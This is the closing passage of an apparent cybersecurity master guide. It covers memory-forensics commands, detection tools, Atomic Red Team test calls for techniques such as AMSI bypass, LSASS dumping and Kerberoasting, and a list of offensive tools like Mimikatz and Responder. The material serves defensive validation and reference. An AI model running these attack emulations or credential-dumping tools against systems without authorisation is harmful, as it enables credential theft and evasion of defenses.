# Installs: Volatility 3, YARA, Ghidra, radare2/Cutter, oledump, pdf-parser,
#           NetworkMiner, Wireshark, FakeNet-NG, inetsim
```
 
**Memory Forensics (Volatility 3)**
```bash
pip3 install volatility3
 
python3 vol.py -f memory.dmp windows.pslist        # process list
python3 vol.py -f memory.dmp windows.malfind       # injected code / hollowing
python3 vol.py -f memory.dmp windows.netscan       # network connections
python3 vol.py -f memory.dmp windows.hollowprocesses
```
 
**Key Detection Tools**
```
PE-sieve    - scan running processes for injection/hollowing (Windows)
Moneta      - in-memory IOC scanner (Windows)
Zeek        - protocol log generation from PCAP or live (Linux primary)
Suricata    - IDS/IPS rules engine (Windows + Linux)
pktmon      - built-in Windows packet capture (Win10 2004+)
Sysmon      - extended Windows event telemetry
Sigma       - cross-platform detection rule format
CyberChef   - decode obfuscated payloads (browser / cross-platform)
```
 
### Purple Team Validation
```powershell
# Install Atomic Red Team
Install-Module -Name invoke-atomicredteam,powershell-yaml -Scope CurrentUser
 
# Key test mappings to Tradecraft files:
Invoke-AtomicTest T1562.001   # AMSI bypass          → av-edr-evasion.md
Invoke-AtomicTest T1055       # Process injection     → av-edr-evasion.md
Invoke-AtomicTest T1218       # LOLBin execution      → lolbins-lolbas.md
Invoke-AtomicTest T1003.001   # LSASS dump           → active-directory.md
Invoke-AtomicTest T1558.003   # Kerberoasting        → active-directory.md
Invoke-AtomicTest T1071.004   # DNS C2               → network-detection.md
```
 
[Return to Table of Contents](#master-table-of-contents)

---

# APPENDICES

## Essential Tools Reference

### Reconnaissance Tools
- nmap - Network scanner
- masscan - Fast port scanner
- theHarvester - OSINT gathering
- Shodan - Internet device search
- Maltego - OSINT visualization

### Exploitation Tools
- Metasploit - Exploitation framework
- sqlmap - SQL injection
- BeEF - Browser exploitation
- Responder - Credential capture

### Post-Exploitation Tools
- Mimikatz - Credential dumping
- BloodHound - AD analysis
- PowerSploit - PowerShell toolkit
- Empire - Post-exploitation framework

## Common Ports Reference
```
21    - FTP
22    - SSH
23    - Telnet
25    - SMTP
53    - DNS
80    - HTTP
110   - POP3
143   - IMAP
443   - HTTPS
445   - SMB
3306  - MySQL
3389  - RDP
```

---

**END OF FIXED CYBERSECURITY MASTER GUIDE**

*This comprehensive guide has been corrected with working internal navigation links.*

## Related Files
- [README.md](README.md) - Repo index
- [ENHANCED_MASTER_GUIDE.md](ENHANCED_MASTER_GUIDE.md) - Enhanced version with PNWC operational experience
- [SPECIALIZED_TOPICS_GUIDE.md](SPECIALIZED_TOPICS_GUIDE.md) - Specialized domains supplement
- [cybersecurity_cliff_notes.md](cybersecurity_cliff_notes.md) - Quick command reference companion
